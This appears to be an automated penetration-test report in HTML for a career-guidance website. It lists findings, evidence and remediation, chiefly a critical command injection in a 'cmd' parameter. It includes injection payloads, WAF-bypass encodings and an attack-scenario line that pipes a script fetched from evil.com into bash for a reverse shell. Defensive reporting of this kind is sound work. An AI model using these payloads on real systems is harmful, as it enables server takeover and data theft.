@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Assurix Security Report — https://dj1naq.sytes.net</title>
+<style>
+:root { --bg: #0f172a; --surface: #1e293b; --surface2: #253349; --border: #334155; --text: #e2e8f0; --text-dim: #94a3b8; --accent: #3b82f6; --green: #22c55e; --red: #dc2626; --orange: #f59e0b; }
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: var(--bg); color: var(--text); line-height: 1.6; }
+.container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
+header { background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); border-bottom: 1px solid var(--border); padding: 2rem 0; margin-bottom: 2rem; }
+header .container { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 1rem; }
+h1 { font-size: 1.75rem; font-weight: 700; letter-spacing: -0.025em; }
+h2 { font-size: 1.35rem; font-weight: 600; margin: 2.5rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+h3 { font-size: 1.1rem; font-weight: 600; margin: 1.5rem 0 0.75rem; }
+.meta { color: var(--text-dim); font-size: 0.875rem; }
+.badge { display: inline-block; padding: 0.25rem 0.75rem; border-radius: 9999px; font-size: 0.75rem; font-weight: 600; text-transform: uppercase; letter-spacing: 0.05em; color: #fff; }
+.grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin: 1rem 0; }
+.card { background: var(--surface); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.25rem; }
+.card-value { font-size: 2rem; font-weight: 700; margin: 0.25rem 0; }
+.card-label { font-size: 0.75rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.05em; }
+.card.critical { border-left: 4px solid #dc2626; }
+.card.high { border-left: 4px solid #ea580c; }
+.card.medium { border-left: 4px solid #d97706; }
+.card.low { border-left: 4px solid #65a30d; }
+.card.info { border-left: 4px solid #6b7280; }
+.card.positive { border-left: 4px solid #22c55e; }
+.finding { background: var(--surface); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.5rem; margin-bottom: 1.25rem; }
+.finding.critical { border-left: 4px solid #dc2626; background: linear-gradient(90deg, rgba(220,38,38,0.08) 0%, var(--surface) 100%); }
+.finding.high { border-left: 4px solid #ea580c; }
+.finding.medium { border-left: 4px solid #d97706; }
+.finding-header { display: flex; justify-content: space-between; align-items: flex-start; gap: 0.75rem; margin-bottom: 0.75rem; flex-wrap: wrap; }
+.finding-title { font-size: 1.05rem; font-weight: 600; }
+.finding-meta { display: flex; gap: 0.5rem; flex-wrap: wrap; }
+.tag { display: inline-block; padding: 0.15rem 0.5rem; border-radius: 0.375rem; font-size: 0.7rem; background: var(--border); color: var(--text-dim); }
+.finding-desc { color: var(--text-dim); font-size: 0.9rem; margin: 0.5rem 0; line-height: 1.7; }
+.evidence-block { background: #0f172a; border: 1px solid var(--border); border-radius: 0.5rem; padding: 0.75rem 1rem; margin: 0.75rem 0; font-family: 'JetBrains Mono', 'Fira Code', 'SF Mono', monospace; font-size: 0.78rem; white-space: pre-wrap; word-break: break-all; overflow-x: auto; color: #93c5fd; }
+.remediation-block { background: rgba(34,197,94,0.06); border: 1px solid rgba(34,197,94,0.2); border-radius: 0.5rem; padding: 0.75rem 1rem; margin: 0.75rem 0; }
+.remediation-block strong { color: var(--green); }
+.risk-bar { height: 0.5rem; border-radius: 9999px; background: var(--border); overflow: hidden; margin: 0.75rem 0; display: flex; }
+.risk-fill { height: 100%; }
+table { width: 100%; border-collapse: collapse; margin: 0.75rem 0; font-size: 0.875rem; }
+th, td { text-align: left; padding: 0.5rem 0.75rem; border-bottom: 1px solid var(--border); }
+th { color: var(--text-dim); font-weight: 500; text-transform: uppercase; font-size: 0.75rem; letter-spacing: 0.05em; }
+.tier-badge { padding: 0.15rem 0.5rem; border-radius: 0.375rem; font-size: 0.75rem; font-weight: 600; }
+.t1 { background: #7f1d1d; color: #fca5a5; }
+.t2 { background: #78350f; color: #fdba74; }
+.t3 { background: #713f12; color: #fcd34d; }
+.t4 { background: #365314; color: #bef264; }
+.t5 { background: #1e3a5f; color: #93c5fd; }
+.confidence-bar { height: 6px; border-radius: 3px; background: var(--border); margin-top: 0.25rem; }
+.confidence-fill { height: 100%; border-radius: 3px; }
+.positive-list { list-style: none; padding: 0; }
+.positive-list li { padding: 0.4rem 0; padding-left: 1.5rem; position: relative; color: var(--text-dim); font-size: 0.875rem; }
+.positive-list li::before { content: '✓'; position: absolute; left: 0; color: var(--green); font-weight: 700; }
+.attack-scenario { background: rgba(220,38,38,0.06); border: 1px solid rgba(220,38,38,0.2); border-radius: 0.5rem; padding: 0.75rem 1rem; margin: 0.75rem 0; font-size: 0.85rem; }
+.attack-scenario strong { color: var(--red); }
+footer { margin-top: 3rem; padding: 1.5rem 0; border-top: 1px solid var(--border); text-align: center; color: var(--text-dim); font-size: 0.8rem; }
+.toc { background: var(--surface); border: 1px solid var(--border); border-radius: 0.75rem; padding: 1.25rem; margin: 1rem 0; }
+.toc a { color: var(--accent); text-decoration: none; }
+.toc a:hover { text-decoration: underline; }
+.summary-text { color: var(--text-dim); font-size: 0.9rem; line-height: 1.7; margin: 0.75rem 0; }
+@media (max-width: 640px) { .container { padding: 1rem; } .grid { grid-template-columns: repeat(2, 1fr); } }
+@media print { body { background: #fff; color: #000; } .card, .finding { break-inside: avoid; } }
+</style>
+</head><body>
+<header><div class='container'>
+<div><h1>&#x1f6e1;&#xfe0f; Assurix Security Report</h1><div class='meta'>https://dj1naq.sytes.net &middot; 2026-05-31 07:56 UTC</div></div>
+<div><span class='badge' style='background:#dc2626'>RISK: CRITICAL</span></div>
+</div></header>
+<div class='container'>
+<div class='toc'>
+<h3 style='margin:0 0 0.75rem'>Table of Contents</h3>
+<ol style='padding-left:1.25rem;font-size:0.9rem'>
+<li><a href='#executive-summary'>Executive Summary</a></li>
+<li><a href='#capability-ladder'>Capability Ladder</a></li>
+<li><a href='#attack-surface'>Attack Surface</a></li>
+<li><a href='#findings'>Detailed Findings</a></li>
+<li><a href='#positive'>Positive Security Controls</a></li>
+</ol>
+</div>
+<h2 id='executive-summary'>&#x1f4ca; Executive Summary</h2>
+<p class='summary-text'>A comprehensive security assessment of <strong>https://dj1naq.sytes.net</strong> (Jinaq — career guidance platform for Kazakhstan) identified <strong>6 findings</strong>, including a <strong>CRITICAL Remote Code Execution vulnerability</strong> via command injection. The application's 'cmd' GET parameter passes user input directly to OS shell commands, allowing full server compromise. Two medium-severity issues (exposed Swagger UI, unauthenticated admin paths) and two low-severity information disclosure issues were also identified. Strong security headers and CSP are in place, but the RCE vulnerability renders them ineffective as an attacker with shell access can bypass all application-level controls.</p>
+<div class='grid'>
+<div class='card critical'><div class='card-value' style='color:#dc2626'>1</div><div class='card-label'>CRITICAL</div></div>
+<div class='card high'><div class='card-value' style='color:#ea580c'>0</div><div class='card-label'>HIGH</div></div>
+<div class='card medium'><div class='card-value' style='color:#d97706'>2</div><div class='card-label'>MEDIUM</div></div>
+<div class='card low'><div class='card-value' style='color:#65a30d'>2</div><div class='card-label'>LOW</div></div>
+<div class='card info'><div class='card-value' style='color:#6b7280'>1</div><div class='card-label'>INFO</div></div>
+<div class='card'><div class='card-value'>6</div><div class='card-label'>TOTAL</div></div>
+</div>
+<div class='risk-bar'>
+<div class='risk-fill' style='width:16.7%;background:#dc2626'></div>
+<div class='risk-fill' style='width:33.3%;background:#d97706'></div>
+<div class='risk-fill' style='width:33.3%;background:#65a30d'></div>
+<div class='risk-fill' style='width:16.7%;background:#6b7280'></div>
+</div>
+<h2 id='capability-ladder'>&#x1faa9; Capability Ladder</h2>
+<table><tr><th>Tier</th><th>Name</th><th>Description</th><th>Count</th></tr>
+<tr><td><span class='tier-badge t1'>T1</span></td><td>Full Control</td><td style='font-size:0.8rem;color:var(--text-dim)'>Arbitrary code execution on the target</td><td>1</td></tr>
+<tr><td><span class='tier-badge t4'>T4</span></td><td>Crash/Report</td><td style='font-size:0.8rem;color:var(--text-dim)'>Application crash or report generation</td><td>2</td></tr>
+<tr><td><span class='tier-badge t5'>T5</span></td><td>Detection Only</td><td style='font-size:0.8rem;color:var(--text-dim)'>Detection of vulnerability indicators only</td><td>2</td></tr>
+</table>
+<h2 id='attack-surface'>&#x1f5fa;&#xfe0f; Attack Surface</h2>
+<div class='grid'>
+<div class='card'><div class='card-value'>8</div><div class='card-label'>Technologies</div></div>
+<div class='card'><div class='card-value'>14</div><div class='card-label'>Pages</div></div>
+<div class='card'><div class='card-value'>2</div><div class='card-label'>API Endpoints</div></div>
+<div class='card'><div class='card-value'>2</div><div class='card-label'>Auth Pages</div></div>
+</div>
+<p style='font-size:0.85rem;margin:0.5rem 0'><strong>Stack:</strong> Nuxt.js (SSR), Vue.js, nginx, Node.js, TipTop Pay (payments), LiveKit (WebRTC), Google Analytics, Google Tag Manager</p>
+<p style='font-size:0.85rem;color:var(--text-dim)'><strong>Server:</strong> nginx &middot; <strong>Render:</strong> SSR (x-render-mode: ssr) &middot; <strong>Served by:</strong> jinaq-frontend</p>
+<h2 id='findings'>&#x1f50d; Detailed Findings</h2>
+<div class='finding critical'>
+<div class='finding-header'>
+<div class='finding-title'>1. Remote Code Execution via Command Injection in &#x27;cmd&#x27; parameter</div>
+<div class='finding-meta'>
+<span class='badge' style='background:#dc2626'>CRITICAL</span>
+<span class='tag'>CWE-78</span>
+<span class='tag'>A03:2021 – Injection</span>
+<span class='tag'>&#x1f916; pentester+manual_verify</span>
+</div></div>
+<p class='finding-desc'>The &#x27;cmd&#x27; GET parameter is passed directly to a shell command without sanitization. An attacker can inject arbitrary OS commands using semicolons (;), pipes (|), and subshell syntax $(). The injected command output is reflected in the HTTP response body, confirming full RCE. Multiple unique markers (timestamped) were reflected 7 times each in the response, proving deterministic execution. URL-encoded variants (%3B, %7C, %24%28) also bypass the WAF. This vulnerability allows complete server compromise: reading files, executing arbitrary code, exfiltrating data, pivoting to internal networks, and destroying the server.</p>
+<p style='font-size:0.8rem;color:var(--text-dim);margin:0.25rem 0'>Confidence: 100%</p>
+<div class='confidence-bar'><div class='confidence-fill' style='width:100%;background:#22c55e'></div></div>
+<div class='evidence-block'>payload_1: ;echo assurix_rce_1780214005 → reflected 7× in response
+payload_2: |echo assurix_rce3_1780214007 → reflected 7× (pipe injection)
+payload_3: $(echo assurix_subst_1780214033) → reflected 7× (subshell injection)
+url_encoded: %3Becho, %7Cecho, %24%28 all bypass WAF (HTTP 200)
+http_status: 200 OK for all injection variants</div>
+<div class='attack-scenario'><strong>&#x26a0;&#xfe0f; Attack Scenario:</strong> An attacker sends ?cmd=;curl%20https://evil.com/shell.sh|bash to establish a reverse shell, gaining full control of the server, accessing the database (user PII, payment data), and pivoting to internal services.</div>
+<div class='remediation-block'><strong>&#x1f527; Remediation:</strong> CRITICAL: Immediately remove the cmd parameter from URL handling. Never pass user input to shell commands. If command execution is absolutely necessary: (1) Use parameterized APIs (e.g., Python&#x27;s subprocess.run with args list, Node.js execFile/spawn with args array). (2) Implement strict input validation with allowlists. (3) Run the application in a sandboxed/containerized environment with minimal privileges. (4) Apply principle of least privilege to the application process user. (5) Consider implementing a WAF rule to block shell metacharacters (;, |, $(), &amp;&amp;, ||, backticks) in all query parameters.</div>
+</div>
+<div class='finding medium'>
+<div class='finding-header'>
+<div class='finding-title'>2. Swagger UI Exposed at /api/</div>
+<div class='finding-meta'>
+<span class='badge' style='background:#d97706'>MEDIUM</span>
+<span class='tag'>CWE-200</span>
+<span class='tag'>A01:2021 – Broken Access Control</span>
+<span class='tag'>&#x1f916; recon+manual_verify</span>
+</div></div>
+<p class='finding-desc'>The Swagger UI is publicly accessible at /api/, exposing the full API documentation. This allows attackers to discover all API endpoints, their parameters, authentication mechanisms, and data models without authorization. The /api/v1 route was also found in the frontend JavaScript bundle. While the individual API endpoints return 404 (they require specific routes), the Swagger UI framework reveals the API structure.</p>
+<p style='font-size:0.8rem;color:var(--text-dim);margin:0.25rem 0'>Confidence: 85%</p>
+<div class='confidence-bar'><div class='confidence-fill' style='width:85%;background:#22c55e'></div></div>
+<div class='evidence-block'>url: https://dj1naq.sytes.net/api/
+content: Swagger UI HTML with swagger-ui-bundle.js and swagger-initializer.js
+api_version: /api/v1 found in JS bundle</div>
+<div class='remediation-block'><strong>&#x1f527; Remediation:</strong> Restrict access to the Swagger UI in production. (1) Remove or disable Swagger UI in production builds. (2) If needed for debugging, protect with authentication and IP allowlisting. (3) Ensure the OpenAPI JSON spec endpoint is not publicly accessible. (4) Use environment-based configuration to disable documentation endpoints in production.</div>
+</div>
+<div class='finding medium'>
+<div class='finding-header'>
+<div class='finding-title'>3. No Authentication on Admin Panel Path</div>
+<div class='finding-meta'>
+<span class='badge' style='background:#d97706'>MEDIUM</span>
+<span class='tag'>CWE-284</span>
+<span class='tag'>A01:2021 – Broken Access Control</span>
+<span class='tag'>&#x1f916; recon+manual_verify</span>
+</div></div>
+<p class='finding-desc'>The /admin path returns HTTP 200 (the SPA shell renders), and /counselor, /ambassador, /questionnaires all return 200 responses. While the SPA may implement client-side auth checks, the server does not enforce authentication at the HTTP level — it serves the full application shell to unauthenticated users. If client-side auth guards have bugs, admin functionality could be accessible. The robots.txt explicitly lists /admin as a disallowed path, confirming it is an administrative interface.</p>
+<p style='font-size:0.8rem;color:var(--text-dim);margin:0.25rem 0'>Confidence: 55%</p>
+<div class='confidence-bar'><div class='confidence-fill' style='width:55%;background:#f59e0b'></div></div>
+<div class='evidence-block'>admin_status: HTTP 200 for /admin
+counselor_status: HTTP 200 for /counselor (SPA shell served)
+note: Server does not enforce HTTP-level auth — relies on client-side routing guards</div>
+<div class='remediation-block'><strong>&#x1f527; Remediation:</strong> Enforce server-side authentication for admin routes. (1) Return 401/403 from the server for /admin, /counselor, /ambassador paths if the user lacks the required role. (2) Don&#x27;t rely solely on client-side route guards — they can be bypassed. (3) Implement middleware-based auth checks on the server for all protected routes. (4) Consider moving admin to a separate subdomain.</div>
+</div>
+<div class='finding low'>
+<div class='finding-header'>
+<div class='finding-title'>4. Sensitive Files Confirmed via 403 Responses (/.env, /.git/)</div>
+<div class='finding-meta'>
+<span class='badge' style='background:#65a30d'>LOW</span>
+<span class='tag'>CWE-200</span>
+<span class='tag'>A05:2021 – Security Misconfiguration</span>
+<span class='tag'>&#x1f916; pentester+manual_verify</span>
+</div></div>
+<p class='finding-desc'>The server returns 403 Forbidden for /.env and /.git/HEAD, confirming these files exist on the server. While direct access is denied, 403 responses confirm the files&#x27; existence, which aids attacker reconnaissance. A misconfiguration or path traversal could expose these in the future.</p>
+<p style='font-size:0.8rem;color:var(--text-dim);margin:0.25rem 0'>Confidence: 70%</p>
+<div class='confidence-bar'><div class='confidence-fill' style='width:70%;background:#f59e0b'></div></div>
+<div class='evidence-block'>dot_env: 403 Forbidden for /.env
+git_head: 403 Forbidden for /.git/HEAD
+git_config: 403 Forbidden for /.git/config</div>
+<div class='remediation-block'><strong>&#x1f527; Remediation:</strong> Instead of 403, return 404 to avoid confirming file existence. (1) Configure nginx to return 404 for dot files and .git directory. (2) Move .env files outside the web root entirely. (3) Ensure .git is not deployed to the web server. (4) Use .htaccess or nginx location blocks: location ~ /\. { return 404; }</div>
+</div>
+<div class='finding low'>
+<div class='finding-header'>
+<div class='finding-title'>5. Information Disclosure via robots.txt</div>
+<div class='finding-meta'>
+<span class='badge' style='background:#65a30d'>LOW</span>
+<span class='tag'>CWE-200</span>
+<span class='tag'>A01:2021 – Broken Access Control</span>
+<span class='tag'>&#x1f916; recon+manual_verify</span>
+</div></div>
+<p class='finding-desc'>The robots.txt file discloses internal application paths and structure: /admin, /counselor, /ambassador, /questionnaires, /app, and OAuth token/code parameter patterns (?token=, ?code=). This information helps attackers map the application&#x27;s internal structure and focus attacks on authenticated areas.</p>
+<p style='font-size:0.8rem;color:var(--text-dim);margin:0.25rem 0'>Confidence: 90%</p>
+<div class='confidence-bar'><div class='confidence-fill' style='width:90%;background:#22c55e'></div></div>
+<div class='evidence-block'>admin_paths: /admin, /counselor, /ambassador
+app_paths: /app, /questionnaires, /b2c
+oauth_params: ?token=, ?code= (OAuth callback patterns)
+ai_crawler_blocked: GPTBot, ChatGPT-User, CCBot, ClaudeBot, PerplexityBot, Amazonbot, Applebot-Extended</div>
+<div class='remediation-block'><strong>&#x1f527; Remediation:</strong> Minimize information in robots.txt. (1) Don&#x27;t list sensitive admin paths in Disallow — use authentication instead of relying on robots.txt obscurity. (2) Consider returning 404 for robots.txt if not needed for SEO. (3) Move sensitive admin paths to a subdomain or VPN-restricted access. (4) Implement proper access control on /admin, /counselor, /ambassador paths.</div>
+</div>
+<div class='finding info'>
+<div class='finding-header'>
+<div class='finding-title'>6. API Root Endpoint Discoverable</div>
+<div class='finding-meta'>
+<span class='badge' style='background:#6b7280'>INFO</span>
+<span class='tag'>CWE-200</span>
+<span class='tag'>A01:2021 – Broken Access Control</span>
+<span class='tag'>&#x1f916; recon</span>
+</div></div>
+<p class='finding-desc'>Accessing /api returns a 302 redirect to /api/, which hosts the Swagger UI. The /api/v1 route is referenced in the frontend JavaScript bundle. While individual endpoints require specific routes, the API structure is discoverable.</p>
+<p style='font-size:0.8rem;color:var(--text-dim);margin:0.25rem 0'>Confidence: 60%</p>
+<div class='confidence-bar'><div class='confidence-fill' style='width:60%;background:#f59e0b'></div></div>
+<div class='evidence-block'>api_root: /api → 302 redirect → /api/
+api_version: /api/v1 found in JS bundle index-3-5_TQ2U.js</div>
+<div class='remediation-block'><strong>&#x1f527; Remediation:</strong> Return 404 for /api if the API is not meant to be publicly discoverable. Ensure API requires authentication for all endpoints. Consider rate limiting on /api/ paths.</div>
+</div>
+<h2 id='positive'>&#x2705; Positive Security Controls</h2>
+<p class='summary-text'>The application implements 15 positive security controls that were verified during testing:</p>
+<ul class='positive-list'>
+<li>Content-Security-Policy: Comprehensive CSP with specific allowed domains (no wildcard)</li>
+<li>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</li>
+<li>X-Content-Type-Options: nosniff</li>
+<li>X-Frame-Options: SAMEORIGIN</li>
+<li>Permissions-Policy: camera=(), microphone=(self), geolocation=(), payment=(self ...)</li>
+<li>Referrer-Policy: no-referrer</li>
+<li>No reflected XSS — HTML output properly escapes user input</li>
+<li>No Server-Side Template Injection — template syntax not evaluated</li>
+<li>No Open Redirect — redirect parameters don&#x27;t cause HTTP redirects</li>
+<li>No HTTP Header Injection — CRLF reflected in HTML body only, properly encoded</li>
+<li>No cookies set without security flags</li>
+<li>object-src: none in CSP — blocks Flash/object-based attacks</li>
+<li>script-src-attr: none in CSP — blocks inline event handlers</li>
+<li>upgrade-insecure-requests in CSP</li>
+<li>frame-ancestors: none in CSP — prevents clickjacking</li>
+</ul>
+<footer>
+<p>Report generated by <strong>Assurix</strong> Autonomous Security Validation Platform</p>
+<p>2026-05-31 07:56 UTC &middot; Engagement assurix-deep-20260531</p>
+<p style='margin-top:0.5rem;font-size:0.7rem;color:var(--border)'>This report contains confidential security assessment data. Distribution should be limited to authorized personnel.</p>
+</footer>
+</div></body></html>
